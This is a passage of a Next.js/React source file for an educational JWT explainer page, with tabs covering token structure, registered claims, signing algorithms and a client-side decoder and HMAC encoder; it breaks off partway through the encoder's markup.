"use client"

import { useState, useCallback } from "react"
import { motion, AnimatePresence } from "framer-motion"
import {
  ArrowLeft, Key, ShieldAlert, Globe, Code2, Zap,
  AlertTriangle, Copy, Plus, Trash2, Lock, User, Server,
  ArrowRight, Info, Clock, Eye, FileKey, RefreshCw,
  CheckCircle2, XCircle, ChevronRight
} from "lucide-react"
import Link from "next/link"
import { cn } from "@/lib/utils"

// Module-level timestamp — captured once at load, safe for React Compiler
const loadTime = Date.now()

type Tab = "overview" | "structure" | "forge" | "flow" | "vulnerabilities"
type Part = "header" | "payload" | "signature"
type ClaimType = "string" | "number" | "boolean"
interface ClaimEntry { id: number; key: string; value: string; type: ClaimType }

// ─── Crypto helpers ──────────────────────────────────────────────────
function b64uEncode(s: string): string {
  return btoa(unescape(encodeURIComponent(s))).replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "")
}
function b64uDecode(s: string): string {
  const p = s.replace(/-/g, "+").replace(/_/g, "/")
  const padded = p.length % 4 ? p + "===".slice(p.length % 4) : p
  try { return decodeURIComponent(escape(atob(padded))) } catch { return "⚠ Invalid encoding" }
}
async function hmacSign(msg: string, secret: string): Promise<string> {
  const enc = new TextEncoder()
  const key = await crypto.subtle.importKey("raw", enc.encode(secret), { name: "HMAC", hash: "SHA-256" }, false, ["sign"])
  const sig = await crypto.subtle.sign("HMAC", key, enc.encode(msg))
  return btoa(Array.from(new Uint8Array(sig)).map(b => String.fromCharCode(b)).join(""))
    .replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "")
}
function parseJWT(token: string) {
  const parts = token.trim().split(".")
  if (parts.length !== 3) return null
  try {
    return { header: JSON.parse(b64uDecode(parts[0])), payload: JSON.parse(b64uDecode(parts[1])), signature: parts[2], parts }
  } catch { return null }
}

// Classic jwt.io sample token (signed with secret "your-256-bit-secret")
const SAMPLE_JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzEyMyIsIm5hbWUiOiJBbGljZSBTbWl0aCIsInJvbGUiOiJ1c2VyIiwiaXNzIjoiYXBpLmV4YW1wbGUuY29tIiwiYXVkIjoiYXBwLmV4YW1wbGUuY29tIiwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjE3MDAwMDM2MDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

const TABS: { id: Tab; label: string }[] = [
  { id: "overview", label: "Overview" },
  { id: "structure", label: "Structure" },
  { id: "forge", label: "⚒ Forge" },
  { id: "flow", label: "Auth Flow" },
  { id: "vulnerabilities", label: "Vulnerabilities" },
]

export default function JWTForgePage() {
  const [tab, setTab] = useState<Tab>("overview")
  return (
    <main className="min-h-screen bg-[#0a0a0a] text-white p-4 sm:p-8 selection:bg-indigo-500/30">
      <nav className="flex justify-between items-center mb-8 max-w-7xl mx-auto">
        <Link href="/" className="flex items-center gap-2 text-gray-500 hover:text-white transition-colors group text-sm">
          <ArrowLeft className="w-4 h-4 group-hover:-translate-x-1 transition-transform" />
          Back to Dashboard
        </Link>
        <div className="px-4 py-1.5 rounded-full bg-indigo-500/10 border border-indigo-500/20 text-indigo-400 text-[10px] font-black uppercase tracking-widest flex items-center gap-2">
          <Key className="w-3 h-3" /> JWT · RFC 7519
        </div>
      </nav>

      <div className="max-w-7xl mx-auto space-y-8">
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="space-y-3">
          <h1 className="text-5xl sm:text-6xl font-black tracking-tighter bg-linear-to-br from-white via-white to-indigo-400 bg-clip-text text-transparent">
            Token Forge
          </h1>
          <p className="text-gray-500 text-sm leading-relaxed max-w-2xl">
            A complete deep-dive into JSON Web Tokens — structure, live encoding, authentication flows, claims, and real attack vectors.
          </p>
        </motion.div>

        <div className="flex gap-2 flex-wrap pb-2 border-b border-white/5">
          {TABS.map(t => (
            <button key={t.id} onClick={() => setTab(t.id)} className={cn(
              "px-5 py-2 rounded-full text-[11px] font-bold uppercase tracking-wider transition-all border",
              tab === t.id ? "bg-indigo-600 border-indigo-400 text-white shadow-lg shadow-indigo-500/20" : "bg-white/5 border-white/10 text-gray-500 hover:border-white/20 hover:text-gray-200"
            )}>{t.label}</button>
          ))}
        </div>

        <AnimatePresence mode="wait">
          <motion.div key={tab} initial={{ opacity: 0, y: 16 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -16 }} transition={{ duration: 0.18 }}>
            {tab === "overview" && <JWTOverview />}
            {tab === "structure" && <JWTStructure />}
            {tab === "forge" && <JWTForge />}
            {tab === "flow" && <JWTFlow />}
            {tab === "vulnerabilities" && <JWTVulnerabilities />}
          </motion.div>
        </AnimatePresence>
      </div>
    </main>
  )
}

/* ════════════════════ OVERVIEW ════════════════════ */
function JWTOverview() {
  return (
    <div className="space-y-6">
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <div className="glass p-8 rounded-[32px] border-white/5 space-y-5">
          <div className="flex items-center gap-3">
            <div className="p-3 rounded-2xl bg-indigo-500/10 text-indigo-400 border border-indigo-500/20">
              <FileKey className="w-5 h-5" />
            </div>
            <h2 className="text-xl font-black tracking-tight">What is a JWT?</h2>
          </div>
          <p className="text-sm text-gray-400 leading-relaxed">
            A <span className="text-white font-semibold">JSON Web Token</span> is an open standard (RFC 7519) for securely transmitting information between parties as a compact, URL-safe string. It is used for <span className="text-indigo-400 font-semibold">authentication</span> (proving who you are) and <span className="text-indigo-400 font-semibold">authorization</span> (proving what you can access).
          </p>
          <p className="text-sm text-gray-400 leading-relaxed">
            Unlike session-based auth, JWTs are <span className="text-white font-semibold">stateless</span> — the server doesn&apos;t need to query a database on every request. The user&apos;s identity is encoded <em>inside</em> the token, and the cryptographic signature proves it hasn&apos;t been tampered with.
          </p>
          <div className="grid grid-cols-2 gap-3 pt-2">
            {[
              { label: "Compact", desc: "URL-safe, fits in HTTP headers or cookies" },
              { label: "Stateless", desc: "No session store — zero DB lookups" },
              { label: "Self-contained", desc: "Carries all identity claims inside" },
              { label: "Signed", desc: "HMAC or RSA cryptographic proof" },
            ].map(item => (
              <div key={item.label} className="p-4 rounded-2xl bg-black/30 border border-white/5 space-y-1">
                <p className="text-xs font-black text-indigo-400 uppercase tracking-widest">{item.label}</p>
                <p className="text-[11px] text-gray-500 leading-relaxed">{item.desc}</p>
              </div>
            ))}
          </div>
        </div>

        <div className="glass p-8 rounded-[32px] border-white/5 space-y-5">
          <h3 className="text-[10px] font-black uppercase tracking-widest text-gray-600">How a JWT looks</h3>
          <div className="font-mono text-[11px] leading-8 break-all bg-black/40 p-6 rounded-2xl border border-white/5">
            <span className="text-rose-400">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span>
            <span className="text-gray-700">.</span>
            <span className="text-violet-400">eyJzdWIiOiJ1c2VyXzEyMyIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzAwMDAzNjAwfQ</span>
            <span className="text-gray-700">.</span>
            <span className="text-blue-400">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span>
          </div>
          <div className="flex flex-wrap gap-6 justify-center">
            {[
              { bg: "bg-rose-400", text: "text-rose-400", label: "Header" },
              { bg: "bg-violet-400", text: "text-violet-400", label: "Payload" },
              { bg: "bg-blue-400", text: "text-blue-400", label: "Signature" },
            ].map(p => (
              <div key={p.label} className="flex items-center gap-2">
                <div className={`w-2.5 h-2.5 rounded-full ${p.bg}`} />
                <span className={`font-mono text-[11px] ${p.text}`}>{p.label}</span>
              </div>
            ))}
          </div>
          <div className="p-5 rounded-2xl bg-amber-500/5 border border-amber-500/15 flex gap-3">
            <AlertTriangle className="w-4 h-4 text-amber-400 shrink-0 mt-0.5" />
            <p className="text-[12px] text-amber-300/70 leading-relaxed">
              <strong>Not encrypted by default.</strong> Anyone who has the token can Base64URL decode the header and payload. The signature only proves <em>integrity</em>, not confidentiality.
            </p>
          </div>
        </div>
      </div>

      <div className="glass p-8 rounded-[32px] border-white/5 space-y-5">
        <h3 className="text-[10px] font-black uppercase tracking-widest text-gray-600">Common Use Cases</h3>
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
          {[
            { icon: <User className="w-5 h-5" />, title: "API Authentication", desc: "After login, every API request carries the JWT in Authorization: Bearer. The server verifies it without touching a database.", color: "indigo" },
            { icon: <Globe className="w-5 h-5" />, title: "Single Sign-On (SSO)", desc: "One JWT authenticates the user across multiple services. The iss claim tracks which auth server issued it.", color: "violet" },
            { icon: <RefreshCw className="w-5 h-5" />, title: "Microservice Trust", desc: "Internal services exchange JWTs to authorize requests. Each service verifies the token independently with the shared public key.", color: "blue" },
          ].map(item => (
            <div key={item.title} className={cn("p-6 rounded-2xl border space-y-3",
              item.color === "indigo" ? "bg-indigo-500/5 border-indigo-500/20" :
              item.color === "violet" ? "bg-violet-500/5 border-violet-500/20" : "bg-blue-500/5 border-blue-500/20"
            )}>
              <div className={cn("w-10 h-10 rounded-xl flex items-center justify-center",
                item.color === "indigo" ? "bg-indigo-500/20 text-indigo-400" :
                item.color === "violet" ? "bg-violet-500/20 text-violet-400" : "bg-blue-500/20 text-blue-400"
              )}>{item.icon}</div>
              <h4 className="text-sm font-bold">{item.title}</h4>
              <p className="text-[12px] text-gray-500 leading-relaxed">{item.desc}</p>
            </div>
          ))}
        </div>
      </div>
    </div>
  )
}

/* ════════════════════ STRUCTURE ════════════════════ */
function JWTStructure() {
  const [active, setActive] = useState<Part>("header")
  return (
    <div className="space-y-6">
      <div className="glass p-6 rounded-[32px] border-white/5 space-y-4">
        <p className="text-[10px] font-black uppercase tracking-widest text-gray-600">
          JWT = Base64URL(Header) + &quot;.&quot; + Base64URL(Payload) + &quot;.&quot; + Signature
        </p>
        <div className="flex h-3 rounded-full overflow-hidden gap-px">
          <button onClick={() => setActive("header")} className={cn("transition-all flex-20", active === "header" ? "bg-rose-400" : "bg-rose-400/25 hover:bg-rose-400/50")} />
          <button onClick={() => setActive("payload")} className={cn("transition-all flex-45", active === "payload" ? "bg-violet-400" : "bg-violet-400/25 hover:bg-violet-400/50")} />
          <button onClick={() => setActive("signature")} className={cn("transition-all flex-35", active === "signature" ? "bg-blue-400" : "bg-blue-400/25 hover:bg-blue-400/50")} />
        </div>
        <div className="flex gap-6 text-[11px]">
          {[
            { id: "header" as Part, color: "text-rose-400", dot: "bg-rose-400", label: "Header (~20%)" },
            { id: "payload" as Part, color: "text-violet-400", dot: "bg-violet-400", label: "Payload (~45%)" },
            { id: "signature" as Part, color: "text-blue-400", dot: "bg-blue-400", label: "Signature (~35%)" },
          ].map(p => (
            <button key={p.id} onClick={() => setActive(p.id)} className={cn("flex items-center gap-2 font-mono transition-colors", active === p.id ? p.color : "text-gray-600 hover:text-gray-400")}>
              <div className={`w-2 h-2 rounded-full ${p.dot}`} /> {p.label}
            </button>
          ))}
        </div>
      </div>

      <AnimatePresence mode="wait">
        <motion.div key={active} initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} transition={{ duration: 0.2 }}>
          {active === "header" && <HeaderDetail />}
          {active === "payload" && <PayloadDetail />}
          {active === "signature" && <SignatureDetail />}
        </motion.div>
      </AnimatePresence>
    </div>
  )
}

function HeaderDetail() {
  return (
    <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
      <div className="glass p-8 rounded-[32px] border-rose-500/10 space-y-5">
        <div className="flex items-center gap-3">
          <div className="w-3 h-3 rounded-full bg-rose-400" />
          <h2 className="text-xl font-black text-rose-400">Header</h2>
        </div>
        <p className="text-sm text-gray-400 leading-relaxed">
          The header describes the <strong className="text-white">token type</strong> and <strong className="text-white">signing algorithm</strong>. It is a JSON object that is then Base64URL encoded to become the first segment of the JWT.
        </p>
        <div className="bg-black/40 p-5 rounded-2xl border border-rose-500/10 font-mono text-sm">
          <pre className="text-rose-300">{`{\n  "alg": "HS256",\n  "typ": "JWT"\n}`}</pre>
        </div>
        <div className="space-y-3">
          {[
            { field: "typ", desc: 'Always "JWT". Identifies the media type of the complete token.' },
            { field: "alg", desc: 'Cryptographic algorithm used to sign the token. HS256, RS256, ES256 are common. "none" is dangerous.' },
          ].map(f => (
            <div key={f.field} className="p-4 rounded-2xl bg-rose-500/5 border border-rose-500/10">
              <code className="text-rose-400 font-black text-sm">{f.field}</code>
              <p className="text-[12px] text-gray-400 leading-relaxed mt-1">{f.desc}</p>
            </div>
          ))}
        </div>
      </div>
      <div className="glass p-8 rounded-[32px] border-white/5 space-y-5">
        <h3 className="text-sm font-black uppercase tracking-widest text-gray-600">Signing Algorithms</h3>
        <div className="space-y-3">
          {[
            { alg: "HS256", full: "HMAC-SHA256", type: "Symmetric", desc: "One shared secret for signing and verifying. Simple but both parties must protect the same key.", color: "indigo", danger: false },
            { alg: "RS256", full: "RSA-SHA256", type: "Asymmetric", desc: "Private key signs, public key verifies. Multiple services can verify without knowing the signing key.", color: "violet", danger: false },
            { alg: "ES256", full: "ECDSA P-256", type: "Asymmetric", desc: "Elliptic curve variant. Shorter signatures than RS256 with equivalent strength. Modern best practice.", color: "blue", danger: false },
            { alg: "none", full: "No signature", type: "DANGEROUS", desc: "No cryptographic protection. If a server accepts this, attackers can forge any token with no secret.", color: "red", danger: true },
          ].map(a => (
            <div key={a.alg} className={cn("p-4 rounded-2xl border flex gap-4", a.danger ? "bg-red-500/5 border-red-500/20" : "bg-white/3 border-white/5")}>
              <code className={cn("text-sm font-black font-mono shrink-0 w-14 pt-0.5", a.danger ? "text-red-400" : a.color === "indigo" ? "text-indigo-400" : a.color === "violet" ? "text-violet-400" : "text-blue-400")}>{a.alg}</code>
              <div>
                <p className="text-[11px] font-bold mb-1">{a.full}
                  <span className={cn("ml-2 px-2 py-0.5 rounded text-[9px]", a.danger ? "bg-red-500/20 text-red-400" : "bg-white/10 text-gray-500")}>{a.type}</span>
                </p>
                <p className="text-[11px] text-gray-500 leading-relaxed">{a.desc}</p>
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  )
}

function PayloadDetail() {
  return (
    <div className="space-y-6">
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <div className="glass p-8 rounded-[32px] border-violet-500/10 space-y-5">
          <div className="flex items-center gap-3">
            <div className="w-3 h-3 rounded-full bg-violet-400" />
            <h2 className="text-xl font-black text-violet-400">Payload (Claims)</h2>
          </div>
          <p className="text-sm text-gray-400 leading-relaxed">
            The payload contains <strong className="text-white">claims</strong> — statements about the user and additional metadata. It is Base64URL encoded, <em>not encrypted</em>.
          </p>
          <div className="p-4 rounded-xl bg-amber-500/5 border border-amber-500/20 flex gap-3">
            <AlertTriangle className="w-4 h-4 text-amber-400 shrink-0" />
            <p className="text-[12px] text-amber-300/70 leading-relaxed">Never put passwords, private keys, or sensitive PII in the payload unless it is also encrypted (JWE).</p>
          </div>
          <div className="bg-black/40 p-5 rounded-2xl border border-violet-500/10 font-mono text-xs">
            <pre className="text-violet-300">{JSON.stringify({ iss: "api.example.com", sub: "user_123", aud: "app.example.com", exp: 1700003600, iat: 1700000000, name: "Alice Smith", role: "user" }, null, 2)}</pre>
          </div>
        </div>
        <div className="glass p-8 rounded-[32px] border-white/5 space-y-4">
          <h3 className="text-sm font-black uppercase tracking-widest text-gray-600">Registered Claims (RFC 7519)</h3>
          <div className="space-y-2">
            {[
              { claim: "iss", name: "Issuer", desc: "Who issued the token (e.g., api.example.com). Recipients validate this to ensure it came from the expected source.", critical: false },
              { claim: "sub", name: "Subject", desc: "Who the token is about — typically a user ID (e.g., user_123). Should be unique and stable.", critical: false },
              { claim: "aud", name: "Audience", desc: "Who the token is intended for. Server MUST reject tokens where aud doesn't match. Missing aud is a critical vulnerability.", critical: true },
              { claim: "exp", name: "Expiration", desc: "Unix timestamp after which the token MUST NOT be accepted. Always include this — tokens without exp never expire.", critical: true },
              { claim: "nbf", name: "Not Before", desc: "Unix timestamp before which the token is not valid. Useful for scheduling future access windows.", critical: false },
              { claim: "iat", name: "Issued At", desc: "Unix timestamp when the token was issued. Useful for measuring token age and detecting stale tokens.", critical: false },
              { claim: "jti", name: "JWT ID", desc: "A unique identifier for this token instance. Enables token revocation via a server-side blocklist to prevent replay attacks.", critical: false },
            ].map(c => (
              <div key={c.claim} className="flex gap-3 p-3 rounded-xl bg-white/3 border border-white/5 hover:bg-white/5 transition-colors">
                <code className="text-violet-400 font-black font-mono text-sm w-10 shrink-0 pt-0.5">{c.claim}</code>
                <div>
                  <p className="text-[11px] font-bold mb-0.5">{c.name} {c.critical && <span className="text-red-400 text-[9px] ml-1 font-black">CRITICAL</span>}</p>
                  <p className="text-[10px] text-gray-500 leading-relaxed">{c.desc}</p>
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>
      <div className="glass p-6 rounded-[24px] border-white/5">
        <h3 className="text-sm font-black uppercase tracking-widest text-gray-600 mb-4">Claim Types</h3>
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <div className="p-5 rounded-2xl bg-violet-500/5 border border-violet-500/10 space-y-2">
            <p className="font-black text-violet-400 text-xs uppercase">Public Claims</p>
            <p className="text-gray-400 text-[12px] leading-relaxed">Registered in the IANA JWT Claims Registry to prevent collisions. Examples: <code className="text-white">name</code>, <code className="text-white">email</code>, <code className="text-white">phone_number</code>, <code className="text-white">picture</code>.</p>
          </div>
          <div className="p-5 rounded-2xl bg-white/5 border border-white/5 space-y-2">
            <p className="font-black text-white text-xs uppercase">Private Claims</p>
            <p className="text-gray-400 text-[12px] leading-relaxed">Custom application-specific claims agreed upon between producer and consumer. Namespace them to avoid collisions: <code className="text-white">https://myapp.com/role</code>.</p>
          </div>
        </div>
      </div>
    </div>
  )
}

function SignatureDetail() {
  return (
    <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
      <div className="glass p-8 rounded-[32px] border-blue-500/10 space-y-5">
        <div className="flex items-center gap-3">
          <div className="w-3 h-3 rounded-full bg-blue-400" />
          <h2 className="text-xl font-black text-blue-400">Signature</h2>
        </div>
        <p className="text-sm text-gray-400 leading-relaxed">
          The signature proves both <strong className="text-white">authenticity</strong> (who issued it) and <strong className="text-white">integrity</strong> (it hasn&apos;t been modified). Without controlling the secret key, an attacker cannot produce a valid signature for a tampered payload.
        </p>
        <div className="bg-black/40 p-5 rounded-2xl border border-white/5 font-mono text-xs space-y-1">
          <p className="text-gray-600">{"// HMAC-SHA256 signing formula:"}</p>
          <p className="text-blue-300 leading-7">
            HMACSHA256(<br />
            &nbsp;&nbsp;<span className="text-rose-300">base64url(header)</span> + &quot;.&quot; +<br />
            &nbsp;&nbsp;<span className="text-violet-300">base64url(payload)</span>,<br />
            &nbsp;&nbsp;<span className="text-emerald-400">SECRET_KEY</span><br />
            )
          </p>
        </div>
        <div className="bg-black/40 p-5 rounded-2xl border border-white/5 font-mono text-xs">
          <p className="text-gray-600 mb-2">{"// Result (Base64URL encoded):"}</p>
          <p className="text-blue-400 break-all">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</p>
        </div>
        <div className="p-4 rounded-2xl bg-blue-500/5 border border-blue-500/10 flex gap-3">
          <Info className="w-4 h-4 text-blue-400 shrink-0" />
          <p className="text-[12px] text-blue-300/70 leading-relaxed">Changing even a single character in the header or payload produces a completely different HMAC output (avalanche effect). Verification is instant.</p>
        </div>
      </div>
      <div className="glass p-8 rounded-[32px] border-white/5 space-y-5">
        <h3 className="text-sm font-black uppercase tracking-widest text-gray-600">Server-Side Verification Flow</h3>
        <div className="space-y-4">
          {[
            { n: 1, title: "Receive Bearer token", desc: 'Client sends: Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1MTIzIn0.xxxx', color: "blue" },
            { n: 2, title: "Split on dots", desc: "Server splits the string into [header], [payload], and [provided_signature] segments.", color: "violet" },
            { n: 3, title: "Recompute signature", desc: "Server runs HMAC-SHA256(header + '.' + payload, SECRET_KEY) to get what the signature should be.", color: "indigo" },
            { n: 4, title: "Constant-time compare", desc: "If computed === provided → token is authentic and unmodified ✓. If different → reject with 401 Unauthorized.", color: "emerald" },
          ].map(s => (
            <div key={s.n} className="flex gap-4 items-start">
              <div className="w-7 h-7 rounded-full bg-white/5 border border-white/10 flex items-center justify-center text-xs font-black shrink-0 mt-0.5">{s.n}</div>
              <div>
                <p className="text-sm font-bold mb-1">{s.title}</p>
                <p className="text-[11px] text-gray-500 leading-relaxed font-mono">{s.desc}</p>
              </div>
            </div>
          ))}
        </div>
        <div className="p-4 rounded-2xl bg-emerald-500/5 border border-emerald-500/10 flex gap-3">
          <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
          <p className="text-[12px] text-emerald-300/70 leading-relaxed">This entire verification takes microseconds and requires zero database queries — this is why JWTs scale effortlessly.</p>
        </div>
      </div>
    </div>
  )
}

/* ════════════════════ FORGE ════════════════════ */
function JWTForge() {
  const [mode, setMode] = useState<"decode" | "encode">("decode")
  const [input, setInput] = useState(SAMPLE_JWT)
  const [algorithm, setAlgorithm] = useState("HS256")
  const [secret, setSecret] = useState("my-super-secret-key")
  const [claims, setClaims] = useState<ClaimEntry[]>(() => [
    { id: 1, key: "sub", value: "user_123", type: "string" },
    { id: 2, key: "name", value: "Alice Smith", type: "string" },
    { id: 3, key: "role", value: "user", type: "string" },
    { id: 4, key: "iss", value: "api.example.com", type: "string" },
    { id: 5, key: "aud", value: "app.example.com", type: "string" },
    { id: 6, key: "exp", value: String(Math.floor(Date.now() / 1000) + 3600), type: "number" },
    { id: 7, key: "iat", value: String(Math.floor(Date.now() / 1000)), type: "number" },
  ])
  const [encoded, setEncoded] = useState("")
  const [nextId, setNextId] = useState(8)
  const [copied, setCopied] = useState(false)

  const decoded = parseJWT(input)
  const isExpired = decoded?.payload?.exp ? decoded.payload.exp * 1000 < loadTime : false

  const generateToken = useCallback(async () => {
    const header = { alg: algorithm, typ: "JWT" }
    const payload: Record<string, string | number | boolean> = {}
    claims.forEach(c => {
      if (!c.key) return
      if (c.type === "number") payload[c.key] = Number(c.value)
      else if (c.type === "boolean") payload[c.key] = c.value === "true"
      else payload[c.key] = c.value
    })
    const h = b64uEncode(JSON.stringify(header))
    const p = b64uEncode(JSON.stringify(payload))
    const sig = await hmacSign(`${h}.${p}`, secret)
    setEncoded(`${h}.${p}.${sig}`)
  }, [claims, algorithm, secret])

  const copyToken = () => {
    navigator.clipboard.writeText(mode === "encode" ? encoded : input)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  return (
    <div className="space-y-6">
      <div className="flex gap-3">
        {[
          { m: "decode" as const, label: "🔍 Decode Token", color: "bg-violet-600 border-violet-400" },
          { m: "encode" as const, label: "⚒ Encode Token", color: "bg-indigo-600 border-indigo-400" },
        ].map(btn => (
          <button key={btn.m} onClick={() => setMode(btn.m)} className={cn(
            "px-6 py-2.5 rounded-full text-sm font-bold border transition-all",
            mode === btn.m ? `${btn.color} text-white shadow-lg` : "bg-white/5 border-white/10 text-gray-500 hover:text-white"
          )}>{btn.label}</button>
        ))}
      </div>

      <AnimatePresence mode="wait">
        {mode === "decode" ? (
          <motion.div key="decode" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <div className="glass p-6 rounded-[32px] border-white/5 space-y-4">
                <div className="flex justify-between items-center">
                  <h3 className="text-sm font-black uppercase tracking-widest text-gray-500">Encoded Token</h3>
                  <button onClick={copyToken} className="flex items-center gap-1.5 text-[11px] text-gray-500 hover:text-white transition-colors">
                    <Copy className="w-3 h-3" /> {copied ? "Copied!" : "Copy"}
                  </button>
                </div>
                <textarea value={input} onChange={e => setInput(e.target.value)} rows={9}
                  placeholder="Paste any JWT here to decode it..."
                  className="w-full bg-black/40 border border-white/10 rounded-2xl p-4 font-mono text-xs text-gray-300 focus:outline-none focus:border-violet-500/50 resize-none leading-relaxed"
                />
                <button onClick={() => setInput(SAMPLE_JWT)} className="text-[11px] text-violet-400 hover:text-violet-300 transition-colors">← Load sample token</button>
                {decoded && (
                  <div className="font-mono text-[10px] leading-7 break-all bg-black/40 p-4 rounded-2xl border border-white/5">
                    <span className="text-rose-400">{decoded.parts[0]}</span>
                    <span className="text-gray-700">.</span>
                    <span className="text-violet-400">{decoded.parts[1]}</span>
                    <span className="text-gray-700">.</span>
                    <span className="text-blue-400">{decoded.parts[2]}</span>
                  </div>
                )}
                {!decoded && input && <p className="text-red-400 text-xs flex items-center gap-2"><XCircle className="w-3 h-3" /> Invalid JWT — must have 3 dot-separated segments</p>}
              </div>

              <div className="space-y-4">
                {decoded ? (
                  <>
                    <div className="glass p-5 rounded-[24px] border-rose-500/10">
                      <p className="text-[10px] font-black uppercase tracking-widest text-rose-400 flex items-center gap-2 mb-3"><span className="w-2 h-2 rounded-full bg-rose-400 inline-block shrink-0" /> Header</p>
                      <pre className="text-rose-300 text-xs font-mono">{JSON.stringify(decoded.header, null, 2)}</pre>
                    </div>
                    <div className="glass p-5 rounded-[24px] border-violet-500/10">
                      <p className="text-[10px] font-black uppercase tracking-widest text-violet-400 flex items-center gap-2 mb-3"><span className="w-2 h-2 rounded-full bg-violet-400 inline-block shrink-0" /> Payload</p>
                      <pre className="text-violet-300 text-xs font-mono">{JSON.stringify(decoded.payload, null, 2)}</pre>
                      {decoded.payload.exp && (
                        <div className={cn("mt-3 p-3 rounded-xl text-[11px] flex items-center gap-2",
                          isExpired ? "bg-red-500/10 border border-red-500/20 text-red-400" : "bg-emerald-500/10 border border-emerald-500/20 text-emerald-400"
                        )}>
                          <Clock className="w-3 h-3" />
                          {isExpired
                            ? `Expired: ${new Date(decoded.payload.exp * 1000).toLocaleString()}`
                            : `Valid until: ${new Date(decoded.payload.exp * 1000).toLocaleString()}`}
                        </div>
                      )}
                      {!decoded.payload.exp && <div className="mt-3 p-3 rounded-xl bg-amber-500/10 border border-amber-500/20 text-amber-400 text-[11px] flex items-center gap-2"><AlertTriangle className="w-3 h-3" /> No exp claim — this token never expires!</div>}
                      {!decoded.payload.aud && <div className="mt-2 p-3 rounded-xl bg-orange-500/10 border border-orange-500/20 text-orange-400 text-[11px] flex items-center gap-2"><ShieldAlert className="w-3 h-3" /> No aud claim — can be used against any service!</div>}
                    </div>
                    <div className="glass p-5 rounded-[24px] border-blue-500/10">
                      <p className="text-[10px] font-black uppercase tracking-widest text-blue-400 flex items-center gap-2 mb-3"><span className="w-2 h-2 rounded-full bg-blue-400 inline-block shrink-0" /> Signature</p>
                      <p className="text-blue-300 text-[11px] font-mono break-all">{decoded.signature}</p>
                      <p className="text-[10px] text-gray-600 italic mt-2">Cannot be verified client-side — you need the secret key.</p>
                    </div>
                  </>
                ) : (
                  <div className="glass p-16 rounded-[32px] border-white/5 flex flex-col items-center text-center gap-3 opacity-20">
                    <Eye className="w-10 h-10" />
                    <p className="text-sm font-bold uppercase tracking-widest">Paste a token to decode</p>
                  </div>
                )}
              </div>
            </div>
          </motion.div>
        ) : (
          <motion.div key="encode" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <div className="glass p-6 rounded-[32px] border-white/5 space-y-5">
                <h3 className="text-sm font-black uppercase tracking-widest text-gray-500">Token Builder</h3>
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-600">Algorithm</label>
                  <select value={algorithm} onChange={e => setAlgorithm(e.target.value)}
                    className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-indigo-500/50 cursor-pointer">
                    <option>HS256</option><option>HS384</option><option>HS512</option>
                  </select>
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-600">Secret Signing Key</label>
                  <input type="text" value={secret} onChange={e => setSecret(e.target.value)}
                    className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-2.5 text-sm font-mono text-emerald-400 focus:outline-none focus:border-emerald-500/50" />
                </div>
                <div className="space-y-3">
                  <div className="flex justify-between items-center">
                    <label className="text-[10px] font-black uppercase tracking-widest text-gray-600">Claims (Payload)</label>
                    <button onClick={() => { setClaims(p => [...p, { id: nextId, key: "", value: "", type: "string" }]); setNextId(n => n + 1) }}
                      className="flex items-center gap-1 text-[11px] text-indigo-400 hover:text-indigo-300 transition-colors">
                      <Plus className="w-3 h-3" /> Add Claim
                    </button>
                  </div>
                  <div className="space-y-2 max-h-48 overflow-y-auto pr-1">
                    {claims.map(c => (
                      <div key={c.id} className="flex gap-2 items-center">
                        <input value={c.key} onChange={e => setClaims(p => p.map(x => x.id === c.id ? { ...x, key: e.target.value } : x))}
                          placeholder="key" className="flex-1 bg-black/40 border border-white/10 rounded-lg px-3 py-2 text-xs font-mono text-violet-400 focus:outline-none focus:border-violet-500/50" />
                        <input value={c.value} onChange={e => setClaims(p => p.map(x => x.id === c.id ? { ...x, value: e.target.value } : x))}
                          placeholder="value" className="flex-1 bg-black/40 border border-white/10 rounded-lg px-3 py-2 text-xs font-mono text-white focus:outline-none focus:border-white/30" />
                        <select value={c.type} onChange={e => setClaims(p => p.map(x => x.id === c.id ? { ...x, type: e.target.value as ClaimType } : x))}
                          className="bg-black/40 border border-white/10 rounded-lg px-2 py-2 text-[10px] text-gray-500 focus:outline-none cursor-pointer">
                          <option value="string">str</option><option value="number">num</option><option value="boolean">bool</option>
                        </select>
                        <button onClick={() => setClaims(p => p.filter(x => x.id !== c.id))} className="text-gray-700 hover:text-red-400 transition-colors">
                          <Trash2 className="w-3.5 h-3.5" />
                        </button>
                      </div>
                    ))}
                  </div>
                </div>
